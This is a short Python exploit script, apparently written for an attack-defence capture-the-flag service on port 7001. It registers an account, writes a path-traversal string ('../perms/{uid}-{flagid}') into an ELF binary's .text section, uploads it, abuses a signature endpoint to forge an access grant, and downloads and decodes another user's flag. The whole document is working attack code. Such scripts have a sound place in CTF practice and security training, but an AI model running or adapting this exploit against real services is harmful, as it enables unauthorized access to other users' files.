#!/usr/bin/env python3

import requests
import sys
import base64
from elftools.elf.elffile import ELFFile

host = sys.argv[1]
flagid = sys.argv[2]
port = 7001

url = f"http://{host}:{port}/api"

username = "hacker"
password = "hacker"

r = requests.post(f'{url}/register/', data={'username': username, 'password': password})

s = requests.Session()

s.post(f'{url}/login/', data={'username': username, 'password': password})

with open("binary", "rb") as f:
    elf = ELFFile(f)
    section = elf.get_section_by_name(".text")
    stext = section.data()
    ssize = section.data_size
    soffset = section.header.sh_offset

with open("binary", "rb") as f:
    elftext = list(f.read())

uid = s.cookies['session']

payload = f"../perms/{uid}-{flagid}".encode()

for i in range(len(payload)):
    elftext[soffset + i] = payload[i]

with open("binary", "wb") as f:
    f.write(bytes(elftext))

r = s.post(f'{url}/upload/', files={'file': open("binary", "rb")})

idx = r.json()['result']

s.post(f'{url}/signature/', data={
    'fileId': idx,
    'offsets': ','.join([str(i) for i in range(len(payload))]),
    'fileType': 'access'
})

r = s.get(f'{url}/download/', params={
    'fileId': flagid
})

print(base64.b64decode(r.json()['result']))